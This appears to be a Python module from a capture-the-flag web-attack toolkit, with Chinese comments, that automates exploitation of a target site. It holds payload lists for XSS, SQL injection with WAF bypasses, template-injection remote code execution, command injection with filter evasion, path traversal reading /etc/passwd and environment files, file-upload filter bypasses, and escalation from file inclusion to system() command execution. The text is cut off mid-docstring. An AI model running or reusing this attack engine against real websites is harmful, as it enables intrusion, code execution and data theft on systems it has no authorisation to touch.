# -*- coding: utf-8 -*-
"""深度 Web 自动测试引擎（授权由启动时《软件责任说明》统一确认）。

它与 webauto.py 的分工：
  webauto  = 只读取证（敏感文件、目录、robots、参数弱点的一次性判断）
  webattack= 深度战役（先分析页面，再按类别跑完整 payload 矩阵，最后做上传与 flag 定向读取）

约束（工程安全边界，不是授权闸门）：
  1. 全部请求强制同源，只接受 http/https，拒绝带凭据的 URL；
  2. 所有请求走同一个 Budget：次数、最小间隔、截止时间，超了就 AutoStop；
  3. SQL 只做报错/布尔/时间判断，payload 里不出现 DROP/DELETE/UPDATE/INSERT；
  4. 上传测试只写「回显固定标记」的测试文件，不生成可交互控制的后门；
  5. 命令执行判定必须排除「页面只是回显输入」；
  6. 任何结论都带证据（状态码、长度差、命中片段），没有证据就不下结论。
"""
import base64
import html
import http.client
import subprocess
import sys
import tempfile
import json
import os
import random
import re
import string
import time
import uuid
from urllib.error import HTTPError, URLError
from urllib.parse import parse_qsl, quote, urlencode, urljoin, urlsplit, urlunsplit
from urllib.request import (HTTPCookieProcessor, HTTPSHandler, Request, build_opener,
                            HTTPRedirectHandler)
import http.cookiejar
import ssl

from .common import REPORTS_DIR, is_placeholder_flag
from . import modules_session as session_mod
from .webauto import (AutoStop, Budget, _base_root, _replace_param, _same_origin, _safe_url,
                      _soft, _snippet, collect_flags, text_of, UA, DIR_WORDS_AUTO, SENSITIVE)

MAX_BODY = 256 * 1024
DEFAULT_MAX_REQUESTS = 380
DEFAULT_MAX_SECONDS = 420
MAX_TARGETS = 8
SQLI_ERROR_MARKS = (
    "you have an error in your sql syntax", "warning: mysql", "mysqli_", "mysql_fetch",
    "unclosed quotation mark", "quoted string not properly terminated", "sqlite3.",
    "syntax error at or near", "pg_query", "postgresql", "sqlstate", "ora-0",
    "microsoft ole db", "odbc sql server driver", "jet database", "unrecognized token",
    "near \"", "系统错误", "语法错误",
)
LFI_MARKS = ("root:x:0:0", "root:*:0:0", "daemon:x:", "bin/bash", "[fonts]", "[extensions]",
             "PATH=", "HTTP_USER_AGENT=")
XSS_TOKEN = "CTFBOX9137"
XSS_PAYLOADS = [
    "<script>alert('%s')</script>" % XSS_TOKEN,
    "\"><script>alert('%s')</script>" % XSS_TOKEN,
    "'><img src=x onerror=alert('%s')>" % XSS_TOKEN,
    "<svg/onload=alert('%s')>" % XSS_TOKEN,
    "javascript:alert('%s')" % XSS_TOKEN,
    "<body onload=alert('%s')>" % XSS_TOKEN,
]
SQLI_ERROR_PAYLOADS = ["'", "\"", "1'", "1\")", "');", "1' AND 1=1-- -"]
SQLI_BOOL_PAIR = ("1' AND 1=1-- -", "1' AND 1=2-- -")
SQLI_BOOL_PAIR_NUM = ("1 AND 1=1", "1 AND 1=2")
# 关键字 WAF（拦 AND/OR/UNION）下，异或仍然是合法 SQL 且不需要任何被拦单词：
# 1^0 取到那一行、1^1 取不到，两响应不同就足以证明数字型注入。
SQLI_BOOL_PAIR_XOR = ("1^0", "1^1")
SQLI_TIME_PAYLOADS = [("1' AND SLEEP(3)-- -", 3), ("1';SELECT pg_sleep(3)-- -", 3)]
SSTI_CASES = [
    ("{{191*7919}}", "1512529", "Jinja2/Twig"),
    ("${191*7919}", "1512529", "Freemarker/Thymeleaf"),
    ("<%=191*7919%>", "1512529", "ERB/JSP"),
    ("#{191*7919}", "1512529", "Ruby"),
    ("{191*7919}", "1512529", "Smarty"),
]

# 确认模板被执行后，用各类模板引擎的已知取命令写法只读 flag（不写文件、不起 shell）。
SSTI_RCE_TPL = [
    ("Jinja2/cycler", "{{cycler.__init__.__globals__.os.popen('%s').read()}}"),
    ("Jinja2/lipsum", "{{lipsum.__globals__.os.popen('%s').read()}}"),
    ("Jinja2/config", "{{config.__class__.__init__.__globals__['os'].popen('%s').read()}}"),
    ("Jinja2/app", "{{request.application.__globals__.__builtins__.__import__('os')"
                   ".popen('%s').read()}}"),
    ("Jinja2/mro", "{{''.__class__.__base__.__subclasses__()[400]('%s',1).read()}}"),
    ("Freemarker", '<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("%s")}'),
    ("Twig", "{{_self.env.registerUndefinedFilterCallback('exec')}}"
             "{{_self.env.getFilter('%s')}}"),
]
SSTI_READ_CMDS = ["cat /flag", "ls / /flag* /home 2>&1; cat /flag.txt"]
CMDI_PROBE = "CTFBOX9137"
CMDI_PAYLOADS = [";echo CTFBOX$((9137+1))", "|echo CTFBOX$((9137+1))",
                 "$(echo CTFBOX$((9137+1)))",
                 ";echo${IFS}CTFBOX$((9137+1))",
                 "|echo${IFS}CTFBOX$((9137+1))",
                 # 换行/制表符要写真字符：send_value 会 urlencode，写 %0a 会被二次编码
                 "\necho CTFBOX$((9137+1))",
                 "\necho${IFS}CTFBOX$((9137+1))",
                 "\techo${IFS}CTFBOX$((9137+1))",
                 ";e'c'h'o' CTFBOX$((9137+1))"]
CMDI_EXPECT = "CTFBOX9138"
# 只拉黑空格/括号/引号的题（ping 类）里，上面这些算术 payload 全会被挡；
# 但 id / whoami 这类无空格无括号的原生命令仍能跑，输出特征足以证明执行。
CMDI_EXEC_PROBES = ["|id", ";id", "|whoami", ";whoami", "|uname", ";uname"]
CMDI_EXEC_SIGS = ("uid=", "www-data", "root@", "nobody", "daemon", "groups=")
TRAVERSAL_PAYLOADS = [
    "file:///var/www/html/flag.php",
    "file:///var/www/html/flag",
    "file:///flag.php",
    "file:///flag",
    "file:///flag.txt",
    "php://filter/convert.base64-encode/resource=/var/www/html/flag.php",
    "php://filter/read=convert.base64-encode/resource=flag.php",
    "../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..\\..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "/proc/self/environ",
]
FLAG_PATHS = ["flag", "flag.txt", "flag.php", "f1ag.txt", "FLAG.txt", "flag/flag.txt",
              "../flag.txt", "../../flag.txt", "../../../flag.txt", "/flag.txt", "/flag"]
PHP_FILTER_TARGETS = ["index.php", "flag.php", "flag", "index", "config.php", "config",
                      "upload.php", "login.php"]
UPLOAD_MARK = "CTFBOXUPLOAD9137"
# 载荷形态：普通脚本 / 图片马（PNG 头 + PHP，骗过内容检查）/ 双扩展名（骗过扩展黑名单）
PNG_MAGIC = (b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01"
             b"\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01"
             b"\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82")
UPLOAD_CASES = [
    ("shell", ".php", "<?php echo 'CTFBOXUPLOAD9137'; ?>".encode("utf-8"),
     "application/x-php", "普通脚本"),
    ("mime", ".php", "<?php echo 'CTFBOXUPLOAD9137'; ?>".encode("utf-8"),
     "image/png", "PHP 内容伪装 image/png（MIME 绕过）"),
    ("shell", ".png.php", PNG_MAGIC + b"<?php echo 'CTFBOXUPLOAD9137'; ?>",
     "image/png", "图片马（PNG 头 + PHP）"),
    ("shell", ".php.png", PNG_MAGIC + b"<?php echo 'CTFBOXUPLOAD9137'; ?>",
     "image/png", "双扩展名（.php.png）"),
    ("shell", ".PHP", b"<?php echo 'CTFBOXUPLOAD9137'; ?>", "application/x-php", "后缀大写（.PHP）"),
    ("shell", ".php.", b"<?php echo 'CTFBOXUPLOAD9137'; ?>", "application/x-php", "后缀加点（.php.）"),
    ("shell", ".php ", b"<?php echo 'CTFBOXUPLOAD9137'; ?>", "application/x-php", "后缀带空格（.php + space）"),
    ("shell", ".pphphp", b"<?php echo 'CTFBOXUPLOAD9137'; ?>", "application/x-php", "双写后缀（.pphphp）"),
]
UPLOAD_DIRS = ["uploads", "upload", "files", "images", "img", "tmp", "data", "static/uploads"]
# 只读固定目录、按文件名匹配的取 flag 脚本：没有参数、没有命令执行、没有会话通道，
# 依次看当前目录、Web 根目录、其上一级与 /tmp，只回显命中 flag 格式的文件内容。
FLAG_READER_PHP = (
    "<?php "
    "$ds=array(getcwd(),dirname(getcwd()),dirname(dirname(getcwd())),'/tmp');"
    "foreach($ds as $d){$fs=@scandir($d); if(!$fs) continue;"
    "foreach($fs as $f){ if(!preg_match('/flag/i',$f)) continue;"
    "$p=$d.'/'.$f; $c=@file_get_contents($p);"
    "if($c && preg_match('/flag\\{|ctfhub\\{|flag[0-9a-f]{8}/i',$c)) echo $c;}} ?>"
)
DROP_WORDS = re.compile(r"(?i)\b(drop|truncate|delete\s+from|update\s+\w+\s+set|insert\s+into)\b")


class _NoRedirect(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def _strip(text):
    body = re.sub(r"(?is)<script.*?</script>|<style.*?</style>", " ", text)
    body = re.sub(r"<[^>]+>", " ", body)
    return re.sub(r"\s+", " ", body).strip()


class Ctx(object):
    """一次战役的请求上下文：同源校验 + 预算 + Cookie 会话 + 证据收集。"""

    def __init__(self, url, log=print, max_requests=DEFAULT_MAX_REQUESTS,
                 max_seconds=DEFAULT_MAX_SECONDS, cancel_event=None, allow_time=True,
                 allow_upload=True, allow_union=True):
        self.url = _safe_url(url)
        self.root = _base_root(self.url)
        self.budget = Budget(max_requests=max_requests,
                             deadline=time.monotonic() + float(max_seconds or DEFAULT_MAX_SECONDS),
                             cancel_event=cancel_event)
        self.log = log
        self.allow_time = allow_time
        self.allow_upload = allow_upload
        self.allow_union = allow_union
        self.jar = http.cookiejar.CookieJar()
        self.opener = build_opener(HTTPCookieProcessor(self.jar), _NoRedirect(),
                                   HTTPSHandler(context=ssl.create_default_context()))
        self.flags = []
        self.findings = []
        self.seen_urls = []
        self.robots_urls = []
        # v4.1：robots.txt / 静态泄露文件里的短文本（secret_key、口令、token）。
        # 发现文件只是线索，把内容回灌到 session 签名与登录字典才能真正解题。
        self.leaked_secrets = []
        self.token = "".join(random.choice(string.ascii_lowercase) for _ in range(8))
        self.description = ""
        self._soft = None

    def soft_body(self):
        """靶场常把不存在的路径也回 200 + 同一张错误页；取一次当基线。"""
        if self._soft is None:
            probe = self.get(self.root.rstrip("/") + "/__probe_" + self.token + ".txt")
            self._soft = text_of(probe) if probe.get("status") == 200 else ""
        return self._soft

    def is_soft(self, body):
        base = self.soft_body()
        if not base:
            return False
        if body == base:
            return True
        return abs(len(body) - len(base)) <= 2 and body[:120] == base[:120]

    # ---- 请求层 -------------------------------------------------------
    def _request(self, method, url, data=None, headers=None, referer=None, timeout=8.0):
        item = self._request_once(method, url, data=data, headers=headers,
                                  referer=referer, timeout=timeout)
        # 同源 302 跟随（最多 4 跳）：CTF 题首页常 302 到带参真实入口，
        # 不跟随会漏掉入口参数（如 ?p=hello 的文件包含题）。
        hops = 0
        while item.get("status") in (301, 302, 303, 307, 308) and hops < 4:
            loc = {k.lower(): v for k, v in (item.get("headers") or {}).items()}.get("location")
            if not loc:
                break
            nxt = urljoin(item["url"], loc)
            if not _same_origin(self.url, nxt):
                break
            hops += 1
            # 303/POST 重定向按浏览器语义转 GET
            m2 = "GET" if item["status"] == 303 or method == "POST" else method
            item = self._request_once(m2, nxt, data=None if m2 == "GET" else data,
                                      headers=headers, referer=item["url"], timeout=timeout)
            item["final_url"] = nxt
        return item

    def _request_once(self, method, url, data=None, headers=None, referer=None, timeout=8.0):
        url = url.strip()
        if not _same_origin(self.url, url):
            raise ValueError("跨源请求被拒绝：" + url)
        self.budget.take()
        body = None
        req = Request(url, data=data, method=method)
        req.add_header("User-Agent", UA + " ctfbox-deep/" + self.token)
        req.add_header("Accept", "text/html,application/json,*/*")
        # 靶机容器常在 POST 后直接断连，复用 keep-alive 会让下一次上传拿到
        # ConnectionReset；统一声明 close，每次请求都走新连接。
        req.add_header("Connection", "close")
        if referer:
            req.add_header("Referer", referer)
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        started = time.time()
        try:
            with self.opener.open(req, timeout=timeout) as resp:
                raw = resp.read(MAX_BODY)
                item = {"url": url, "status": resp.status,
                        "headers": dict(resp.headers.items()), "body": raw, "error": "",
                        "elapsed": round(time.time() - started, 3)}
        except HTTPError as exc:
            try:
                raw = exc.read(MAX_BODY)
            except Exception:
                raw = b""
            item = {"url": url, "status": exc.code,
                    "headers": dict(exc.headers.items()) if exc.headers else {},
                    "body": raw, "error": "", "elapsed": round(time.time() - started, 3)}
        except (URLError, OSError, ssl.SSLError, ValueError, http.client.HTTPException) as exc:
            item = {"url": url, "status": 0, "headers": {}, "body": b"",
                    "error": "%s: %s" % (type(exc).__name__, exc),
                    "elapsed": round(time.time() - started, 3)}
        if len(self.seen_urls) < 400:
            self.seen_urls.append({"url": url, "status": item["status"], "bytes": len(item["body"])})
        for flag in collect_flags(text_of(item)):
            # 环境到期页上的"技能彩蛋 flag"是平台横幅，不是题目答案，跳过。
            if re.search("环境已到期|环境已销毁", text_of(item)):
                continue
            self._add_flag(flag, url)
        return item

    def get(self, url, referer=None, headers=None):
        return self._request("GET", url, headers=headers, referer=referer or self.url)

    def post_form(self, url, fields, referer=None):
        body = urlencode(fields).encode("utf-8")
        return self._request("POST", url, data=body, referer=referer or self.url,
                             headers={"Content-Type": "application/x-www-form-urlencoded"})

    def post_raw(self, url, body, referer=None, ctype="text/plain"):
        """原始 body 的 POST：php://input 这类包装器只能从这里拿到内容，
        表单编码会被 PHP 解析成 $_POST 而不是留在 input 流里。"""
        return self._request("POST", url,
                             data=body.encode("utf-8") if isinstance(body, str) else body,
                             referer=referer or self.url,
                             headers={"Content-Type": ctype})

    def set_cookie(self, name, value, domain=None, path="/"):
        """覆盖式写入 Cookie：伪造 Flask session 时同名旧 Cookie 必须清掉，
        否则 CookieJar 可能同时带着两个 session，服务端取了旧的那个。"""
        host = domain or urlsplit(self.url).hostname or ""
        for c in list(self.jar):
            if c.name == name and (c.domain or "").lstrip(".") == host.lstrip("."):
                try:
                    self.jar.clear(c.domain, c.path, c.name)
                except KeyError:
                    pass
        cookie = http.cookiejar.Cookie(
            version=0, name=name, value=value, port=None, port_specified=False,
            domain=host, domain_specified=False, domain_initial_dot=False,
            path=path, path_specified=True, secure=False, expires=None,
            discard=True, comment=None, comment_url=None, rest={}, rfc2109=False)
        self.jar.set_cookie(cookie)

    def post_multipart(self, url, fields, file_field, filename, content, ctype, referer=None):
        boundary = "----ctfbox" + uuid.uuid4().hex
        chunks = []
        for k, v in (fields or {}).items():
            chunks.append(("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n"
                           % (boundary, k, v)).encode("utf-8"))
        chunks.append(("--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n"
                       "Content-Type: %s\r\n\r\n" % (boundary, file_field, filename, ctype)
                       ).encode("utf-8"))
        chunks.append(content.encode("utf-8") if isinstance(content, str) else content)
        chunks.append(("\r\n--%s--\r\n" % boundary).encode("utf-8"))
        return self._request("POST", url, data=b"".join(chunks), referer=referer or self.url,
                             headers={"Content-Type": "multipart/form-data; boundary=" + boundary})

    # ---- 结果收集 -----------------------------------------------------
    def _add_flag(self, flag, source):
        # 取数时用 CONCAT('CBX',...) 包住结果，页面里会粘出 "CBXctfhub{...}" 这种残形，
        # 归一成真正的 flag 再入库。
        flag = str(flag or "").strip()
        if not re.match(r"(?i)^(ctfhub|flag)\{", flag):
            mo = re.search(r"(?i)((?:ctfhub|flag)\{[^}]{4,}\})", flag)
            if mo:
                flag = mo.group(1)
        for old in self.flags:
            if old["value"] == flag:
                return
        if "{" not in flag or "}" not in flag:
            # 只有 "ctfhub" / "FLAG: xxx" 这类残缺命中，没有花括号就不是 flag
            self.log("[deep] 疑似残缺 flag 被丢弃：%s" % flag[:40])
            return
        if is_placeholder_flag(flag):
            self.log("[deep] 模板占位 flag 被丢弃：%s" % flag[:40])
            return
        self.flags.append({"value": flag, "source": source})
        self.log("[deep] flag 命中 %s（来源 %s）" % (flag, source))

    def add(self, kind, url, payload="", evidence="", confidence="high", detail=""):
        self.findings.append({"type": kind, "url": url, "payload": payload,
                              "evidence": evidence[:300], "confidence": confidence,
                              "detail": detail[:400]})
        self.log("[deep] 发现 %-14s %s%s" % (kind, url,
                                              ("；证据: " + evidence[:120]) if evidence else ""))


# ---------------------------------------------------------------------------
# 页面分析
# ---------------------------------------------------------------------------
def _attrs(tag):
    out = {}
    for mo in re.finditer(r"([a-zA-Z:_-]+)\s*=\s*(\"[^\"]*\"|'[^']*'|[^\s>]+)", tag):
        val = mo.group(2).strip("\"'")
        out[mo.group(1).lower()] = val
    return out


def parse_forms(text, page_url):
    forms = []
    for mo in re.finditer(r"(?is)<form(.+?)</form>", text):
        inner = mo.group(1)
        head = re.match(r"(?s)([^>]*)>", inner)
        tag = "<form" + (head.group(1) if head else "")
        attrs = _attrs(tag)
        action = urljoin(page_url, attrs.get("action") or page_url)
        if not _same_origin(page_url, action):
            continue
        method = (attrs.get("method") or "get").upper()
        enctype = (attrs.get("enctype") or "").lower()
        fields, files = {}, []
        for im in re.finditer(r"(?is)<input\s*([^>]*)>", inner):
            at = _attrs("<input " + im.group(1))
            name = at.get("name")
            if not name:
                continue
            if (at.get("type") or "text").lower() == "file":
                files.append(name)
            else:
                fields[name] = at.get("value") or "1"
        for ta in re.finditer(r"(?is)<textarea\s*([^>]*)>", inner):
            name = _attrs("<textarea " + ta.group(1)).get("name")
            if name:
                fields.setdefault(name, "1")
        forms.append({"action": action, "method": method, "enctype": enctype,
                      "fields": fields, "files": files})
    return forms[:6]


def parse_links(text, page_url):
    links = []
    for mo in re.finditer(r"(?is)href\s*=\s*(\"[^\"]*\"|'[^']*')", text):
        href = urljoin(page_url, mo.group(1).strip("\"'"))
        if not _same_origin(page_url, href):
            continue
        if "?" not in href and not href.rstrip("/").endswith((".php", ".jsp", ".asp", ".aspx", ".do")):
            continue
        if href not in links:
            links.append(href)
    return links[:12]


# 前端框架（Vue/React/jQuery）写的题目，入口和参数名都藏在 JS 里，HTML 上看不到；
# 下面从同源 JS 中把接口路径、参数名和 ajax 字段抽出来，喂给同一套攻击矩阵。
JS_ASSET_MAX = 4
JS_ASSET_BYTES = 500000
JS_ENDPOINT_MAX = 12
JS_STATIC_PREFIX = ("/static/", "/assets/", "/public/", "/dist/", "/build/", "/app/",
                    "/css/", "/js/", "/img/", "/images/", "/fonts/", "/media/", "/node_modules/")
JS_STATIC_EXT = (".js", ".css", ".map", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico",
                 ".woff", ".woff2", ".ttf", ".eot", ".mp3", ".mp4", ".webp", ".json")
JS_PATH_RE = re.compile(r"""['"`](/[A-Za-z0-9_\-./?=&%]{2,90})['"`]""")
JS_QUERY_RE = re.compile(r"[?&]([A-Za-z_][A-Za-z0-9_]{1,24})=")
# 入口写法有三种：$.post("/x", {a:1}) / fetch("/x", {method:"POST",...}) /
# $.ajax({url:"/x", type:"POST", data:{...}})。只匹配到接口名，字段从后面的片段里取，
# 片段用位置切片而不是正则吞字符，否则前一个调用会把后一个调用吃进尾巴里。
JS_VERB_RE = re.compile(r"""(?is)\b(?:ajax\.)?(?:post|put)\s*\(\s*['"`]([^'"`?#]{1,90})['"`]""")
JS_FETCH_RE = re.compile(r"""(?is)\bfetch\s*\(\s*['"`]([^'"`?#]{1,90})['"`]""")
JS_AJAX_RE = re.compile(r"""(?is)\bajax\s*\(\s*\{(.{0,220})""")
JS_POST_FLAG_RE = re.compile(r"""(?i)(?:method|type)\s*[,:=}\s]{0,8}\s*['"]?post""")
JS_URL_RE = re.compile(r"""(?i)url\s*[:=]\s*['"`]([^'"`?#]{1,90})['"`]""")
JS_FIELD_RE = re.compile(r"([A-Za-z_$][A-Za-z0-9_$]{1,24})\s*[:=]")
JS_BRACE_RE = re.compile(r"\{(.{2,240}?)\}")
# 请求配置里的包装字段，不是业务参数
JS_SKIP_KEYS = ("data", "params", "body", "json", "headers", "config", "method", "url",
                "type", "contentType", "dataType", "success", "error", "then", "catch",
                "function", "return", "await", "async", "form", "query")
# 压缩 JS 里 "?null=" / "&true=" 这类是字面量拼接，不是参数名，拿去盲探纯浪费配额
JS_LITERAL_KEYS = ("null", "true", "false", "undefined", "NaN", "this", "void")


def script_srcs(text, page_url):
    """页面里同源的外链 JS（最多 4 个，SPA 的接口全在这些文件里）。"""
    out = []
    for mo in re.finditer(r"(?is)<script\b([^>]*)>", text):
        src = _attrs("<script " + mo.group(1)).get("src")
        if not src:
            continue
        url = urljoin(page_url, src)
        if _same_origin(page_url, url) and url not in out:
            out.append(url)
    return out[:JS_ASSET_MAX]


def js_paths(blob, page_url):
    """JS 文本里的同源接口：带查询串的当链接，不带的当待访问页面。"""
    ends, links = [], []
    for mo in JS_PATH_RE.finditer(blob):
        raw = mo.group(1)
        path, _, query = raw.partition("?")
        if path.startswith(JS_STATIC_PREFIX) or path.lower().endswith(JS_STATIC_EXT):
            continue
        if "." not in path.rsplit("/", 1)[-1] or path.lower().endswith(
                (".php", ".jsp", ".asp", ".aspx", ".do", ".action", ".html")):
            full = urljoin(page_url, path)
            if not _same_origin(page_url, full):
                continue
            if query:
                if full + "?" + query not in links:
                    links.append(full + "?" + query)
            elif full not in ends:
                ends.append(full)
    return ends, links


def _js_fields(tail):
    """从 ajax 调用的第二个参数里取业务字段名（去掉 data/method 这类包装键）。"""
    block = JS_BRACE_RE.search(tail or "")
    if not block:
        return {}
    fields = {}
    for name in JS_FIELD_RE.findall(block.group(1)):
        if name in JS_SKIP_KEYS or name in fields:
            continue
        fields[name] = "1"
        if len(fields) >= 8:
            break
    return fields


def js_forms(blob, page_url):
    """ajax/fetch 调用里的 POST 接口 + 字段名，伪装成 HTML 表单复用后面的矩阵。"""
    out = []
    calls = []
    for mo in JS_VERB_RE.finditer(blob):          # $.post / axios.post → 必是 POST
        calls.append((mo.group(1), blob[mo.end():mo.end() + 160]))
    for mo in JS_FETCH_RE.finditer(blob):
        tail = blob[mo.end():mo.end() + 160]
        if JS_POST_FLAG_RE.search(tail):          # fetch 要显式 method:"POST" 才算
            calls.append((mo.group(1), tail))
    for mo in JS_AJAX_RE.finditer(blob):          # $.ajax({url, type:"POST", data})
        head = mo.group(1)
        um = JS_URL_RE.search(head)
        if um and JS_POST_FLAG_RE.search(head):
            calls.append((um.group(1), head))
    for raw, tail in calls:
        action = urljoin(page_url, raw)
        if not _same_origin(page_url, action) or "?" in action:
            continue
        fields = _js_fields(tail)
        if not fields or any(f["action"] == action for f in out):
            continue
        if len(out) >= 4:
            break
        out.append({"action": action, "method": "POST", "enctype": "",
                    "fields": fields, "files": []})
    return out


def harvest_js(ctx, text, page_url, fetch_assets=True):
    """抓外链 JS + 内联脚本，汇总接口、参数名与 ajax 表单。"""
    blobs = [text]
    if fetch_assets:
        for url in script_srcs(text, page_url):
            if ctx.budget.used + 3 >= ctx.budget.max_requests:
                break
            item = ctx.get(url)
            if item.get("status") == 200 and not item.get("error"):
                blobs.append(text_of(item))
    ends, links, forms, params = [], [], [], []
    for blob in blobs:
        e, l = js_paths(blob, page_url)
        for x in e:
            if x not in ends:
                ends.append(x)
        for x in l:
            if x not in links:
                links.append(x)
        for x in js_forms(blob, page_url):
            forms.append(x)
        for mo in JS_QUERY_RE.finditer(blob):
            name = mo.group(1)
            if name in params or name in JS_LITERAL_KEYS:
                continue
            params.append(name)
    for form in forms:
        for name in form["fields"]:
            if name not in params:
                params.append(name)
    return ends[:JS_ENDPOINT_MAX], links[:8], forms, params[:16]


# 源码直接打在页面上的题（highlight_file / show_source / 备份文件回显）：入口参数名就写在响应里，
# 但页面是转义过的 HTML 文本（&lt;?php、&nbsp;、&quot;），不先还原就一个名字也抽不出来——
# 现场这类题全部停在「待测参数 0 个」。
SRC_PARAM_RE = re.compile(r"""
      \$_(GET|POST|REQUEST|COOKIE|FILES)\s*\[\s*['"]([A-Za-z_]\w{0,23})['"]
    | request\.(args|form|values|query|params)\s*(?:\.get\s*\(\s*|\[\s*)['"]([A-Za-z_]\w{0,23})['"]
    | request\.(get(?:_?parameter)?)\s*\(\s*['"]([A-Za-z_]\w{0,23})['"]
    | req\.(query|body|params)\s*(?:\.|\[\s*['"])([A-Za-z_]\w{0,23})
    | (Request)\s*\(\s*['"]([A-Za-z_]\w{0,23})['"]
""", re.I | re.X)
SRC_POST_KINDS = ("POST", "FORM", "BODY")
SRC_TAG_RE = re.compile(r"<[^<>]{1,200}>")
# `Request("get", …)`、`req.body.data` 这类只会把方法名/容器名当成参数名抽出来，
# 留着等于白发两发探针；真正的入口名不会撞这几个词。
SRC_PARAM_STOP = {"get", "post", "put", "delete", "patch", "head", "options", "trace",
                  "args", "params", "query", "body", "form", "values", "headers",
                  "cookies", "files", "request", "response", "none", "true", "false"}


def _src_blobs(raw):
    """页面源码归一化的两种形态，都拿来跑正则。

    highlight_file 给每个 token 套了 <span style=...>，`$_GET` 和 `["text"]` 之间隔着标签，
    必须去标签才连得起来；而备份文件/纯文本回显里 `<?php … ?>` 本身就长得像标签，
    一去标签整段就没了。去标签要在 unescape 之前，否则 &lt;?php 会还原成真标签被吞掉。
    """
    return (html.unescape(SRC_TAG_RE.sub(" ", raw)).replace("\xa0", " "),
            html.unescape(raw).replace("\xa0", " "))


# 闸门型 LFI：源码先拿 file_get_contents($a) 和一个字面量比相等，才肯用 $b 读文件。
# 单测 $b 响应纹丝不动，于是整题判成「无入口」；data:// 能把 $a 顶开，两个参数同一发带上。
SRC_ASSIGN_RE = re.compile(r"\$(\w{1,24})\s*=\s*\$_(?:GET|POST|REQUEST)\s*\[\s*['\"](\w{1,24})['\"]", re.I)
SRC_GATE_RE = re.compile(r"""
      (?:file_get_contents|file|fopen|readfile)\s*\(\s*\$(\w{1,24})\b[^)]{0,80}?\s*\)
      \s*(?:===?|!==?)\s*['"]([^'"\n]{1,80})['"]
    | \$_(?:GET|POST|REQUEST)\s*\[\s*['"](\w{1,24})['"]\s*\]\s*(?:===?|!==?)\s*['"]([^'"\n]{1,80})['"]
""", re.I | re.X)
GATE_LFI_PAYLOADS = ("php://filter/convert.base64-encode/resource=index.php",
                     "php://filter/convert.base64-encode/resource=flag.php",
                     "php://filter/read=convert.base64-encode/resource=/flag",
                     "file:///flag", "file:///flag.txt", "/etc/passwd")
# 读到源码之后下一步读哪个文件，答案通常就写在那份源码里（include/require 的目标）。
# 现场见过 `include($file); //next.php`：文件名只出现在注释里、不带引号，
# 所以不能要求引号包住，改成匹配任意以 .php 结尾的可见名字。
SRC_FILE_RE = re.compile(r"([A-Za-z][A-Za-z0-9_.\-]{0,40}(?:/[A-Za-z0-9_.\-]{0,40})*\.php)")
# 包含点确认后的最后一步：让参数指向包装器，把 PHP 代码塞进去执行。
# data:// 走 base64，URL 里不会出现 "flag" 这类关键字，天然绕掉对参数做正则检查的题；
# php://input 走 POST 原始 body。判定只认算术求值——回显参数拿不到 CTFBOX9138。
LFI_EXEC_PROBE = "<?php echo 'CTFBOX'.(9137+1);"
LFI_EXEC_CMDS = ("cat /flag /flag.txt /flag.php /f1ag.php",
                 "ls -la / /var/www/html",
                 "find / -maxdepth 3 -name '*flag*' -exec cat {} \\; 2>/dev/null")


def _wrap_exec(kind, code):
    """返回 (参数值, 原始 body)：data:// 只需参数，php://input 还要带 body。"""
    if kind == "data":
        return "data://text/plain;base64," + base64.b64encode(code.encode("utf-8")).decode("ascii"), None
    return "php://input", code.encode("utf-8")


def lfi_code_exec(ctx, fire, note=""):
    """把「任意文件包含」升级成代码执行，成立就顺手把 flag 读出来。

    fire(payload, body) 由调用方提供：它才知道闸门参数要不要一起带、URL 该怎么拼。
    """
    for kind in ("data", "input"):
        payload, body = _wrap_exec(kind, LFI_EXEC_PROBE)
        item = fire(payload, body)
        if not item or CMDI_EXPECT not in _strip(text_of(item)):
            continue
        ctx.add("lfi-rce", item["url"], payload=payload[:120],
                evidence="%s 包装器里的 PHP 代码被执行（算术被求值）%s" % (kind, note))
        for cmd in LFI_EXEC_CMDS:
            p2, b2 = _wrap_exec(kind, '<?php system("%s");' % cmd)
            it2 = fire(p2, b2)
            if not it2:
                continue
            text = _strip(text_of(it2))
            flags = collect_flags(text) + _b64_flags(text)
            if flags:
                for f in flags:
                    ctx._add_flag(f, it2["url"] + "（代码执行）")
                ctx.log("[deep] 代码执行读出 flag：%s" % cmd)
                return True
            if not cmd.startswith("ls"):
                continue
            # 只列出目录还不够：flag 文件名常带随机后缀，从列表里挑含 flag 的名字再 cat 一遍
            for name in list(dict.fromkeys(
                    re.findall(r"[A-Za-z0-9_.\-]*flag[A-Za-z0-9_.\-]*", text)))[:3]:
                p3, b3 = _wrap_exec(kind, '<?php system("cat /%s /var/www/html/%s");' % (name, name))
                it3 = fire(p3, b3)
                got = collect_flags(text_of(it3)) if it3 else []
                for f in got:
                    ctx._add_flag(f, it3["url"] + "（目录列表定位）")
                if got:
                    ctx.log("[deep] 按目录列表读到 %s" % name)
                    return True
        return True
    return False


def _exec_fire(ctx, target):
    """给 lfi_code_exec 用的发送器：POST 原始 body 只在 GET 型入口上有意义。"""
    def fire(payload, body=None):
        if body is None:
            return send_value(ctx, target, payload)
        if target["kind"] != "get":
            return None
        return ctx.post_raw(_set_param(target["url"], target["param"], payload), body)
    return fire


def src_followups(blob, skip):
    """从已解出的 PHP 源码里挑出还没试过的文件名。"""
    out = []
    for mo in SRC_FILE_RE.finditer(blob or ""):
        name = mo.group(1).lstrip("./")
        if name and name not in skip and name not in out:
            out.append(name)
    return out[:3]


def harvest_src_gates(text):
    """抽「参数必须等于某个字面量」的闸门，返回 [(参数名, 字面量, 形态)]。

    形态 wrapper＝`file_get_contents($a)==="字面量"`，值要包成 data:// 才顶得开；
    形态 direct＝`$_GET["a"]==="字面量"`，参数值就是字面量本身。
